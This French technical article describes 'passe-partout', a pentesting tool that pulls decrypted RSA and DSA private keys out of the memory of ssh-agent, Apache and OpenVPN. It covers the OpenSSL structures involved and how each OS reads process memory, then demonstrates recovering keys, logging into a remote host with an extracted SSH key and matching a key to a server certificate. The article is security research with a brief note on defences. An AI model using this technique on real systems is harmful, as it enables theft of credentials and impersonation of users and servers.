# Extraction de clés SSL en mémoire


This article is available in english at `README.md`.

L'outil passe-partout présenté dans cette brève peut être trouvé à la page passe-partout.


# Introduction

Les programmes ayant un fort besoin de confidentialité utilisent de plus en
plus la cryptographie asymétrique. La sécurité de la cryptographie
asymétrique repose sur la confidentialité de la clé privée. D'une manière
générale, les programmes manipulant des clés privées RSA ou DSA implémentent
un mécanisme demandant à l'utilisateur un mot de passe afin de déchiffrer
la clé privée accessible sur le système de fichiers.

Parmi les programmes utilisant ce procédé, on retrouve par exemple :
 - le serveur HTTP Apache qui déchiffre les clés privées associées aux
   certificats SSL lors de son démarrage ;
 - ssh-agent pour les clés SSH RSA ou DSA ;
 - OpenVPN pour les certificats client ou serveur selon son mode d'utilisation.

Cette brève présente une méthode générique permettant d'extraire les clés
privées d'OpenSSL stockées dans la mémoire d'un processus, et décrit son
utilisation pour ssh-agent, le serveur HTTP Apache et enfin OpenVPN.


# Quelles structures utilisent OpenSSL ?

## Structure RSA

La page de manuel rsa(3) d'OpenSSL fournit les principales informations quant à
la structure RSA utilisée par la libcrypto :

   extrait de `rsa(2)`

   These functions implement RSA public key encryption and signatures as
   defined in PKCS #1 v2.0 [RFC 2437].

   The RSA structure consists of several BIGNUM components. It can contain
   public as well as private RSA keys:

```C
    struct
           {
           BIGNUM *n;              // public modulus
           BIGNUM *e;              // public exponent
           BIGNUM *d;              // private exponent
           BIGNUM *p;              // secret prime factor
           BIGNUM *q;              // secret prime factor
           BIGNUM *dmp1;           // d mod (p-1)
           BIGNUM *dmq1;           // d mod (q-1)
           BIGNUM *iqmp;           // q^-1 mod p
           // ...
           };
```


On retrouve tous les nombres entiers nécessaires à la signature et au
chiffrement RSA (n, e, d) ainsi que d'autres nombres permettant d'accélérer
les calculs.

## Structure DSA

On apprend de même, dans la page de manuel dsa(3) d'OpenSSL :

extrait de `dsa(3)`

   The DSA structure consists of several BIGNUM components.

```C
    struct
           {
           BIGNUM *p;              // prime number (public)
           BIGNUM *q;              // 160-bit subprime, q | p-1 (public)
           BIGNUM *g;              // generator of subgroup (public)
           BIGNUM *priv_key;       // private key x
           BIGNUM *pub_key;        // public key y = g^x
           // ...
           }
```
    DSA;


## Structure BIGNUM

Encore une fois, la page de manuel bn_internal(3) décrit la structure de
données utilisée ainsi que les principales méthodes relatives à ce format.

extrait de `/usr/include/openssl/bn.h`

```C
    struct bignum_st
        {
        BN_ULONG *d;    /* Pointer to an array of 'BN_BITS2' bit chunks. */
        int top;    /* Index of last used d +1. */
        /* The next are internal book keeping for bn_expand. */
        int dmax;   /* Size of the d array. */
        int neg;    /* one if the number is negative */
        int flags;
        };
```


Cette structure relativement simple est utilisée pour stocker de grands
entiers, les clés RSA pouvant utiliser jusqu'à plusieurs milliers de bits.

# Comment sont stockées les clés privées ?

## Pour ssh-agent

Extrait de la page de manuel de ssh-agent(1) :


 "ssh-agent is a program to hold private keys used for public key
  authentication (RSA, DSA).  The idea is that ssh-agent is started in
  the beginning of an X-session or a login session, and all other
  windows or programs are started as clients to the ssh-agent program."


Les clés privées sont enregistrées auprès de ssh-agent par le programme
ssh-add via le socket spécifié dans les variables d'environnement.
Lors de l'ajout d'une clé privée, la clé est déchiffrée si nécessaire
afin de pouvoir servir pendant un certain laps de temps et stockée
en mémoire.

On trouve dans ssh-agent.c l'inclusion du fichier key.h.

Plus bas dans le code source sont stockées les clés privées qui contiennent
effectivement les structures "RSA" et "DSA" de la bibliothèque libcrypto :

extrait de `key.h,v 1.24`

```C
    struct Key {
        int type;
        int flags;
        RSA *rsa;                                   <===
        DSA *dsa;                                   <===
    };
```


Les structures "RSA" et "DSA" contiennent toutes les informations
nécessaires à la reconstruction de la clé sous sa forme déchiffrée.


```bash
$ ldd /usr/bin/ssh-agent | grep libcrypto
  libcrypto.so.0.9.8 => /usr/lib/i686/cmov/libcrypto.so.0.9.8 (0xb7d8a000)
```



Il est à noter que depuis le 12 août 2002, le code source de ssh-agent fait
appel aux fonctions setgid(2) et setegid(2) de façon à interdire la lecture de
la mémoire du processus à tout autre utilisateur que root :

http://www.openbsd.org/cgi-bin/cvsweb/src/usr.bin/ssh/ssh-agent.c.diff?r1=1.99&r2=1.98&f=h



## Pour Apache

Apache2 peut servir des sites sur HTTPS grâce à mod_ssl. On trouve en effet dans
la configuration par défaut (sous Ubuntu) d'un vhost :


```bash
    SSLCertificateFile    /etc/ssl/certs/ssl-cert-snakeoil.pem
    SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
```


Si la clé privée est protégée par un mot de passe, à tout démarrage (ou
redémarrage) Apache demandera le mot de passe à l'utilisateur afin de pouvoir
accéder à ce fichier.


```bash
$ ldd /usr/lib/apache2/modules/mod_ssl.so | grep libcrypto
  libcrypto.so.0.9.8 => /usr/lib/i686/cmov/libcrypto.so.0.9.8 (0xb7d4c000)
```


Les clés sont stockées sous la forme de structure EVP_PKEY dans la structure
modssl_pk_server_t :

extrait de `modules/ssl/ssl_private.h`

```C
    /** public cert/private key */
    typedef struct {
         /**
          * server only has 1-2 certs/keys
          * 1 RSA and/or 1 DSA
          */
         const char  *cert_files[SSL_AIDX_MAX];
         const char  *key_files[SSL_AIDX_MAX];
         X509        *certs[SSL_AIDX_MAX];
         EVP_PKEY    *keys[SSL_AIDX_MAX];           <===

         /** Certificates which specify the set of CA names which should be
          * sent in the CertificateRequest message: */
         const char  *ca_name_path;
         const char  *ca_name_file;
    } modssl_pk_server_t;
```



## Pour OpenVPN

    extrait de la configuration d'OpenVPN

```conf
     cert client.crt
     key client.key
```


OpenVPN utilise lui aussi des clés au format OpenSSL, et en cas de doute on
peut en obtenir la confirmation en observant les bibliothèques avec
lesquelles il est lié :


```bash
   $ ldd /usr/sbin/openvpn | grep libcrypto
        libcrypto.so.0.9.8 => /lib/i686/cmov/libcrypto.so.0.9.8 (0x0060e000)
```


La gestion des certificats PEM est délégué à la bilibothèque OpenSSL. Les
clés sont donc implicitement stockées dans des structures EVP_PKEY à cause
de l'utilisation de la fonction SSL_CTX_use_PrivateKey_file.


# Implémentation d'un extracteur de clés

Afin de lire la mémoire d'un processus, chaque système d'exploitation
dispose d'un API spécifique (généralement non portable).

Par exemple, sous Linux, la mémoire peut être lue en utilisant le système
de fichier procfs (/proc/pid/mem) ou en utilisant l'API de debugging (terme
certainement trop flateur...) ptrace.

La recherche des clés privées en mémoire passe par l'identification de
plusieurs variables et structures gardées par le processus visé.

Les données peuvent notamment se trouver :
  - sur la pile (stack) ;
  - sur le tas (heap) ;
  - dans le segment de donnée de l'exécutable lié au processus ;
  - dans une page anonyme (ex: page allouée avec mmap).


## Lecture dans la mémoire d'un processus

Afin d'être portable, l'outil d'extraction de clé dispose d'une portion de
code spécifique à chaque système d'exploitation.

Les techniques utilisées pour lire la mémoire sont résumées ci-dessous :


| OS           | fonction
|--------------|------------------------
| Linux        | ptrace(PTRACE_PEEKDATA)
| Solaris      | ptrace(2)
| *BSD         | ptrace(PT_READ_D)
| HP-UX        | ttrace(TTRACE_READ)
| Windows      | ReadProcessMemory
| Mac OS X     | vm_read_overwrite


Voici les techniques utilisées par notre outil pour lister les zones
mémoires valides d'un processus:

  
| OS           | moyen
|--------------|--------------------------
| Linux        | Lecture de /proc/pid/maps
| Solaris      | Lecture de /proc/pid/map (tableau de prmap_t)
| FreeBSD      | Lecture de /proc/pid/map
| NetBSD       | Lecture de /proc/pid/maps ou "pmap -l -p"
| OpenBSD      | "procmap -l -p"
| DragonFlyBSD | Lecture de /proc/pid/map
| Mac OS X     | Fonction mach_vm_region


L'utilisation de commandes comme "pmap" ou "procmap" permet de lister les
zones mémoire d'un processus sans être root sur certains Unix. En effet les
Unix de la branche BSD ont tendance à favoriser l'approche de binaires set-uid
afin de lire directement les informations dans la mémoire du noyau
(/dev/kmem).

Étant donné que l'outil a vocation a être utilisé sans nécessairement avoir de
privilège root, il utilise les binaires set-uid du système.

Voici un exemple de listing des zones mémoires utilisée par ssh-agent :


```bash
$ head -n 3 /proc/2620/maps
08048000-08058000 r-xp 00000000 08:01 446297  /usr/bin/ssh-agent
08058000-08059000 rw-p 0000f000 08:01 446297  /usr/bin/ssh-agent  <===
08059000-0807b000 rw-p 08059000 00:00 0       [heap]              <===
```



## Vérification des données obtenues

Le parcours de la mémoire doit se faire à la recherche des structures RSA et
DSA. Ces structures ont pour particularité de contenir des pointeurs contigus
vers des BIGNUM, et chaque BIGNUM contient lui-même un pointeur vers un tableau
de type BN_ULONG.

Ces structures ne peuvent pas être accédées directement (puisqu'elles ne sont
pas dans l'espace d'adressage de notre processus) mais par l'intermédiaire de
la méthode de lecture utilisée.

Une fois une structure trouvée, dont on a pu lire tous les pointeurs en les
interprétant comme des BIGNUM ou BN_ULONG, il convient de vérifier qu'il s'agit
en effet d'une vraie structure RSA ou DSA.

OpenSSL fournit pour RSA la fonction RSA_check_key, prenant en argument une
structure RSA, et effectuant quelques validations :

Clé publique RSA :
     - p et q sont tous les deux premiers

     - n = p * q
     - (x^e)^d = x [n]


Aucune fonction équivalente n'est fournie pour DSA, on vérifie donc
"manuellement" une propriété de l'algorithme DSA :

Clé publique DSA :

      pub_key = a^p [m]



# Démonstrations

L'outil passe-partout présenté dans cette brève peut être trouvé à la page passe-partout.

## ssh-agent

Création des clés RSA (publique et privée) chiffrées avec le mot de
passe "mysuperpassword" :


```bash
$ ssh-keygen -qN mysuperpassword -t rsa -f /tmp/myrsa.key
```


Remplacement de la liste des clés autorisées à se connecter sur le
serveur distant avec la nouvelle clé publique :


```bash
$ scp /tmp/myrsa.key.pub 192.168.0.1:~/.ssh/authorized_keys2
admin@192.168.0.1's password:
myrsa.key.pub                              100%  393     0.4KB/s   00:00
```


Démarrage d'une nouvelle instance de ssh-agent :


```bash
$ eval `ssh-agent`
Agent pid 4712
```


Enregistrement de la clé RSA privée auprès de ssh-agent :


```bash
$ ssh-add /tmp/myrsa.key
Enter passphrase for /tmp/myrsa.key:
Identity added: /tmp/myrsa.key (/tmp/myrsa.key)
```


À partir de ce moment, la clé privée est déchiffrée et stockée dans la
mémoire du processus ssh-agent.
Il est maintenant possible de lire la clé privée avec l'extracteur en
tant qu'utilisateur root :


```bash
$ sudo ./passe-partout 4712
[sudo] password for jb:
Target has pid 4712
on_signal(17 - SIGCHLD) from 4712
[-] invalid DSA key.
[-] invalid DSA key.
[-] invalid DSA key.
[-] invalid DSA key.
[X] Valid RSA key found.
[X] Key saved to file id_rsa-0.key
[-] invalid DSA key.
[-] invalid DSA key.
[-] invalid DSA key.
[-] invalid DSA key.
done for pid 4712
```



Sauvegarde de la clé privée déchiffrée dans id_rsa-0.key.
Désormais on peut retirer la clé privée du ssh-agent :


```bash
$ ssh-add -D
All identities removed.
```


Et enfin tester l'authentification avec la clé RSA obtenue précedemment
sachant qu'elle n'est plus protégée par un mot de passe. Les permissions
du fichier myplain.key doivent être 0600.


```bash
$ ssh -2vF /dev/null -i id_rsa-0.key -o "PreferredAuthentications publickey" 192.168.0.1
OpenSSH_4.3p2 Debian-6, OpenSSL 0.9.8e 23 Feb 2007
debug1: Reading configuration data /dev/null
debug1: Connecting to 192.168.0.1 [192.168.0.1] port 22.
debug1: Connection established.
debug1: identity file myplain.key type -1
[...]
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: publickey
debug1: Trying private key: myplain.key                          <===
debug1: read PEM private key done: type RSA                      <===
debug1: Authentication succeeded (publickey).                    <===
debug1: channel 0: new [client-session]
debug1: Entering interactive session.

Last login: Wed Aug 22 17:16:00 2007 from 192.168.0.51
admin@192.168.0.1:~$
```


et voila :)

## Serveur HTTP Apache

L'extraction des clés sur un processus Apache est beaucoup plus verbeuse :

```bash
  $ ./passe-partout 29960
  Target has pid 29960
  on_signal(17 - SIGCHLD) from 29960
  [-] invalid DSA key.
  [-] invalid DSA key.
  [...]
  [-] unable to check key.
  [-] unable to check key.
  [X] Valid DSA key found.
  [X] Key saved to file id_dsa-0.key
  [-] unable to check key.
  [...]
  [X] Valid DSA key found.
  [X] Key saved to file id_dsa-26.key
  [...]
  [X] Valid RSA key found.
  [X] Key saved to file id_rsa-0.key
  [...]
  [X] Valid RSA key found.
  [X] Key saved to file id_rsa-2.key
  [-] invalid DSA key.
  [-] invalid DSA key.
  [-] invalid DSA key.
  [-] invalid DSA key.
  done for pid 29960
  $ ls *key
  id_dsa-0.key   id_dsa-15.key  id_dsa-20.key  id_dsa-26.key  id_dsa-7.key
  id_dsa-10.key  id_dsa-16.key  id_dsa-21.key  id_dsa-2.key   id_dsa-8.key
  id_dsa-11.key  id_dsa-17.key  id_dsa-22.key  id_dsa-3.key   id_dsa-9.key
  id_dsa-12.key  id_dsa-18.key  id_dsa-23.key  id_dsa-4.key   id_rsa-0.key
  id_dsa-13.key  id_dsa-19.key  id_dsa-24.key  id_dsa-5.key   id_rsa-1.key
  id_dsa-14.key  id_dsa-1.key   id_dsa-25.key  id_dsa-6.key   id_rsa-2.key
```



Malgré la présence pour ce serveur Apache d'un seul vhost, utilisant un seul
certificat SSL (le certificat Debian par défaut), on remarque que Apache utilise
en mémoire un très grand nombre de clés (26 clés DSA en mémoire, et de 3 clés
RSA). Ces clés sont générées en grande partie lors de l'initialisation de
mod_ssl.

Toutes ces clés sont différentes, il est donc nécessaire de trouver la clé
utilisée dans le certificat du serveur, les autres étant des clés générées de
façon temporaire.

Pour ce faire, l'utilitaire match_private_key.rb lit chaque clé et en compare
le module (n = p*q) à celui du serveur (puisque le module est publié dans le
certificat exposé par le serveur).

Il peut être utilisé de deux façons :

 - en obtenant le certificat manuellement :

```bash
  $ openssl s_client -connect localhost:443> server_certificate.txt
  depth=0 /CN=ubuntu
  verify error:num=18:self signed certificate
  verify return:1
  depth=0 /CN=ubuntu
  verify return:1
  $ ruby match_private_key.rb server_certificate.txt
  id_rsa-2.key
```


 - ou en laissant l'utilitaire obtenir le certificat lui-même :

```bash
  $ ruby match_private_key.rb https://server.fr
  id_rsa-2.key
```


Le test est effectué simplement en itérant sur les clés obtenues depuis la
mémoire :


```ruby
  if key.public_key.to_pem == server_cert.public_key.to_pem then
    puts "#{key_file} is the private key associated to the certificate #{ARGV[0]}"
    exit 1
  end
```





## OpenVPN

La méthode est identique avec OpenVPN :


```bash
  $ ps aux|grep openvpn
  root     30006  0.0  0.1   5116  3060 pts/25   S+   14:54   0:00 openvpn openvpn.config
  jb       31179  0.0  0.0   3056   824 pts/22   R+   15:02   0:00 grep --color openvpn
  $ sudo ./passe-partout 30006
  Target has pid 30006
  testing /lib/tls/i686/cmov/libc-2.10.1.so (0x251000)
  testing anonymous (0x252000)
  testing /lib/i686/cmov/libcrypto.so.0.9.8 (0x4ea000)
  testing anonymous (0x4f7000)
  testing /usr/lib/liblzo2.so.2.0.0 (0x747000)
  testing /lib/libz.so.1.2.3.3 (0x794000)
  testing /lib/tls/i686/cmov/libpthread-2.10.1.so (0x979000)
  testing anonymous (0x97a000)
  testing /lib/ld-2.10.1.so (0xc0f000)
  testing /lib/tls/i686/cmov/libdl-2.10.1.so (0xc52000)
  testing /lib/i686/cmov/libssl.so.0.9.8 (0xd82000)
  testing /usr/lib/libpkcs11-helper.so.1.0.0 (0xf7b000)
  testing /usr/sbin/openvpn (0x80c0000)
  testing anonymous (0x80c1000)
  testing [heap] (0x85c3000)
  [X] Valid RSA key found.
  [X] Key saved to file id_rsa-0.key
  [-] invalid DSA key.
  [-] invalid DSA key.
  [-] invalid DSA key.
  [-] invalid DSA key.
  testing anonymous (0xb7754000)
  testing anonymous (0xb778f000)
  testing [stack] (0xbfdab000)
  done for pid 30006
```


L'extraction a réussi, comme le montre la comparaison de cette clé avec la clé
originale :



```bash
  $ diff -s ida_ras-0.key /crypt/Certificats/my.key
  Les fichiers id_rsa-0.key et /crypt/Certificats/my.key sont identiques.
```


# Conclusion

Il est important de comprendre que toutes les applications de type "trousseau de
clés privées" sont potentiellement vulnérables à cette attaque. La seule
protection possible nécessite que l'application qui manipule les clés supprime
explicitement les secrets de sa mémoire. Ceci est souvent réalisé passé un
certain délai (souvent configurable). Utiliser un délai trop faible diminue
fortement l'intérêt des outils de gestion des clés qui sont censés faciliter la
vie en évitant de redemander le mot de passe toutes les 5 minutes.

Cette brève considère le cas des clés RSA/DSA avec OpenSSL. La technique est
cependant applicable à tout type de secret, par exemple avec les hash NTLM
stockés dans la mémoire de lsass.exe sous Windows.

L'intérêt de l'extraction de clés de chiffrement en mémoire est l'absence de
modification de l'environnement, des programmes ou de la configuration lors
d'un test d'intrusion.

- Nicolas Collignon 

- Jean-Baptiste Aviat (@jbaviat)


# Références

 - Site Web d'OpenSSH :
   http://www.openssh.org
 - Site Web d'OpenVPN :
   http://openvpn.net
 - Site Web du serveur web Apache :
   http://httpd.apache.org

 - "Revisite de la configuration du client OpenSSH"
   http://www.hsc.fr/ressources/breves/ssh_config.html.fr


Initialement publie sur http://www.hsc.fr/ressources/breves/passe-partout.html.fr
